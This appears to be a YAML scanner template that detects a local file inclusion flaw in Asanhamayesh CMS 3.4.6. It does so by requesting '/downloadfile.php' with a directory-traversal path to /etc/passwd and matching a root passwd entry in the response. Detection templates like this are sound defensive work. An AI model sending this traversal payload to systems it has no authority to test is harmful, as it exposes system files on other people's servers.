id: "asanhamayesh-lfi"
name: "Asanhamayesh CMS 3.4.6 - Local File Inclusion"
severity: "high"
description: "Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "asanhamayesh"
  - "lfi"
  - "traversal"
  - "vuln"
reference: "https://cxsecurity.com/issue/WLB-2018030006"
spaExclusion: true
request:
  method: "GET"
  path: "/downloadfile.php?file=../../../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
